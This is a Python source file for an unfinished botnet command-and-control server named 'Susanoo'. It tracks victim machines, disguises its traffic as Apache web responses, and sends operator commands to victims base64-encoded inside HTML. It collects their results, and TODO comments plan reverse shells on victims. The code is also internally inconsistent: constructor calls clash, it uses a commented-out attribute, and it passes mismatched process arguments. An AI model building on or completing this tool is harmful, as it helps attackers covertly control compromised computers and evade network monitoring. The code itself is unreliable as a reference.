#!/usr/bin/python

import socket
import sys
import os
import multiprocessing
import threading
import queue
import time
import pytz
import re
import base64
import signal
import hashlib
from datetime import datetime
from tabulate import tabulate
# from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

slaves = {}
master = {}


# Tasks Needed to be done:
#     Find a way to format output in terminal
#     Write code to get data from client result and store it in a queue for later examination 
#     Usage of UP and DOWN arrow keys to switch between history
#     Find a way to use dictonaries rather than queues


'''************************UPDATE THIS*****************************
1: Write showResults function and sort out addToQueue Threading
2: find a way to send shell on the victim
3: write a thread to get a shell from the victim.
'''

EXIT_FLAG = False

def nodeHash(host, port):
    data = ("%s:%d" % (host, port)).encode()
    return hashlib.md5(data).hexdigest()


class Slave():
    def __init__(self,client,cookie):                              # initialize all the details of this class
        
        self.client = client
        self.hostname, self.port = client.getpeername()
        self.cookie = cookie
        # self.node_hash = nodeHash(self.hostname,self.port)
        self.cmd_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self.india_timezone = pytz.timezone('Asia/Kolkata')      # set timezone
        self.time = datetime.now(self.india_timezone)
        self.sendCookie()
        # self.cmd_parent_pipe,self.result_child_pipe, self.new_process = self.createConnectionProcess() 

    def sendCookie(self):
        send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\nSet-Cookie: '
        send_data = send_data + self.cookie + "\r\n\r\n"
        send_data = send_data.encode('utf-8')
        self.client.sendall(send_data)

    def killProcess(self):
        # self.client.shutdown(socket.SHUT_RDWR)
        self.new_process.terminate()
        self.client.close()

    def addToQueue(self):
        while(True):
            cmd = self.cmd_child_pipe.recv()
            if cmd == "lols":
                lols = list(self.cmd_queue.queue)
                sys.stdout.write("\n")
                for item in lols:
                    sys.stdout.write("{}\n".format(item))
            else:
                self.cmd_queue.put(cmd)


    def clientExecuter(self,data):
        try:    
            # sys.stdout.write("[DEBUG] data Recieved\n{}".format(data))
            send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
                
            if (self.cmd_queue.empty()):
                cmd = "helloworld"
            else:
                cmd = self.cmd_queue.get()
            cmd_byte = cmd.encode('utf-8')

            if(re.findall('POST',data[:20])):
                base = base64.b64encode(cmd_byte).decode('utf-8')
                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
                data_pos_start = data.find('Data: ') + 6
                data_pos_end = data.find(' :end')
                result_encoded = data[data_pos_start : data_pos_end].decode('utf-8')
                result = base64.b64decode(result_encoded)
                self.result_queue.put(result)

            elif(re.findall('GET',data[:20])):
                base = base64.b64encode(cmd_byte).decode('utf-8')
                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
            else:
                send_data = send_data + 'NO Request method found\r\n'
                
            send_data = send_data.encode('utf-8')
            self.client.sendall(send_data)

        except Exception:
            sys.stdout.write("\nError While sending data to {}:{} with cookie {}\n".format(self.hostname,str(self.port),self.cookie))
            self.removeNode()
            
        self.client.shutdown(socket.SHUT_RDWR)
        self.client.close()
       


    def clientCmdShell(self):

        try:
            while(True):
                client_cmd = str(input("{}> ".format(self.new_process.name)))
                if(client_cmd == ""):
                    pass
                elif(client_cmd == "help"):
                    sys.stdout.write("yolo : exit\nlols : list commands to send\nshell : get rev shell\n")
                elif(client_cmd == "yolo"):
                    break
                elif(client_cmd =="lols"):                  # list all commands yet to send to current victim
                    self.cmd_parent_pipe.send("lols")
                elif(client_cmd == "results"):
                    self.showResults()
                else:
                    self.cmd_parent_pipe.send(client_cmd)
        except Exception as ex:
                sys.stdout.write("\n[-] Unable to Read Command. Reason: {}\n".format(ex))    


    def createConnectionProcess(self):

        try:
            self.cmd_parent_pipe, self.cmd_child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
            self.result_parent_pipe, self.result_child_pipe = multiprocessing.Pipe()  # Creating Pipe to get the result from the new process
            self.new_process = multiprocessing.Process(target=self.clientExecuter,args=(self.client,self.cmd_child_pipe,self.result_parent_pipe))
            
            self.new_process.start()
            sys.stdout.write("\n[+] {}:{} connected as {}".format(self.hostname,str(self.port),self.new_process.name))
            # Created new process for every connection that I get and save the process in process_list
            return self.cmd_parent_pipe, self.result_child_pipe, self.new_process
        except Exception as ex:
            sys.stdout.write("\n[-] Unable to Create New Process for this Connection {}:{}. Reason: {}\n".format(self.hostname,str(self.port),ex))

        
    def removeNode(self):
        try:
            slaves.pop(self.cookie)
        
        except Exception as ex:
            sys.stdout.write("\n[-] Unable to Remove Node. Reason: {}\n".format(ex))
    
    

            



def switch(process_name):

    try:
        flag = 0
        for key in slaves.keys():
            slave = slaves[key]
            if(slave.new_process.name == process_name):
                flag = 1
                slave.clientCmdShell()
                break
        if(flag == 0):
            sys.stdout.write("\n[Error] No process found by the name: {}\n".format(process_name))
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to Switch Process. Reason: {}\n".format(ex))



def handlerExecuter(cmd):

    try:
        if(cmd[:5]=='kill '):    # kill specified connection
            proc_name = cmd[5:]
            flag = 0
            for key in slaves.keys():
                slave = slaves[key]
                if(slave.new_process.name == proc_name):
                    slave.killProcess()
                    slave.removeNode()
                    sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
                    flag = 1
                    break
            if(flag == 0):
                sys.stdout.write("[-] Process not found. Please specify name clearly. eg: kill Process-3\n")

        elif(cmd[:7]=="killall"):   # kill all conntections
            flag = 0
            for key in slaves.keys():
                slave = slaves[key]
                flag = 1
                proc_name = slave.new_process.name
                slave.killProcess()
                sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
            if flag == 1:
                slaves.clear()
            else:
                sys.stdout.write("[-] Process not found\n")

        elif(cmd[:4] == "list"):    # list all the connected hosts
            # sys.stdout.write("[DEBUG] inside list")
            flag = 0
            for key in slaves.keys():
                flag = 1
                slave = slaves[key]
                sys.stdout.write("{} => {}:{}\n".format(slave.new_process.name,slave.hostname,slave.port))
            if flag == 1:
                sys.stdout.write("***List Empty***\n")
        elif(cmd[:6] == "switch"):
            process_name = cmd[7:]
            switch(process_name)
            # sys.stdout.write("[DEBUG] switch")

        else:
            sys.stdout.write("\nCOMMANDS:\nlist\t\t\t:\tto list all the connected devices\nkill {processname}\t:\tkill the specified connection\nkillall\t\t\t:\tkill all connected\nswitch {processname}\t:\tswitch to different connection\n")
    
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to execute Commands. Reason: {}\n".format(ex))

def createNewCookie(client):
    hostname, port = client.getpeername()
    india_timezone = pytz.timezone('Asia/Kolkata')      # set timezone
    time = datetime.now(india_timezone)
    data = ("%s:%d %s"%(hostname,port,time)).encode()   # taking MD5 hash
    new_cookie = hashlib.md5(data).hexdigest()          # New cookie is created
    slave = Slave(client,new_cookie)
    slaves[new_cookie] = slave

def checkCookie(client):
    data = client.recv(4096)
    data = data.decode('utf-8')
    cookie_pos = data.find('Cookie:')
    key_found = False
    if(cookie_pos != -1):
        cookie = data[cookie_pos+8:cookie_pos+40]
        for key in slaves.keys():
            if key == cookie:
                slave = slaves[cookie]                           
                slave.clientExecuter(data)
                key_found = True
                break
        if(key_found == False):
            sys.stdout.write("[-] Bad Cookie detected\n")
            sys.stdout.write("[+] Sending New Cookie\n")
            createNewCookie(client)
    else:
        createNewCookie(client)

def ctrlCHandler(signum, frame):
    sys.stdout.write("\nctrl-c is pressed to exit type \'exit\'\n")

def handlerCmdShell():

    try:
        while(True):
            handler_cmd = str(input("Susanoo> "))
            if(handler_cmd == ""):
                pass
            elif(handler_cmd == "exit"):
                EXIT_FLAG = True
                sys.stdout.write("\n[+] Killing all running processes")
                for key in slaves.keys():
                    slave = slaves[key]
                    # sys.stdout.write("[DEBUG] slave = {}\n".format(slave))
                    time.sleep(0.1)
                    slave.killProcess()
                time.sleep(2)
                os._exit(0)
                # Close all the process one by one and exit the program after that
            else:
                handlerExecuter(handler_cmd)
    except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handlerCmdShell. Reason: {}\n".format(ex))
            os._exit(0)





def listener(lhost,lport):

    try:
        signal.signal(signal.SIGINT,ctrlCHandler)
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost,lport))
        sock.listen(100)
        # Started the listener which can handle 100 connections.
        sys.stdout.write ("\n[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
            
        handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=())
        handler_cmd_thread.start()
        # Handler cmd shell started here.
        # It is running as serperate thread to give us an free cmd shell while listener runs in background.
        connection_count = 1
        while(True):
            repeat = False
            if EXIT_FLAG:
                break
            (client,client_addr) = sock.accept()
            hash = nodeHash(client_addr[0],client_addr[1])
            for i in slaves.keys():         # checking if connection already exists for this client
                slave = slaves[i]
                if slave.node_hash == hash:
                    repeat = True
                    break
            if repeat:                      # kill connection if same connection is already up
                sys.stdout.write("\n[-] Same Connection Detected")
                client.shutdown(socket.SHUT_RDWR)
                client.close()
            else:
                slave = Slave(client,connection_count)
                slaves[connection_count] = slave
                connection_count = connection_count + 1
                # Created new object in class slave and stored in dictonary slaves for every connection

        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as ex:
        sys.stdout.write("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
        sys.stdout.write("\n[+] Killing all running processes")
        for key in slaves.keys():
            slave = slaves[key]
            time.sleep(0.1)
            slave.killProcess()
        time.sleep(2)
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        os._exit(0)


def main():
    if(len(sys.argv) < 3):
        sys.stdout.write("\n[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport)
            
        except Exception as ex:
            sys.stdout.write("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
            # exit(0)



if __name__ == '__main__':
    main()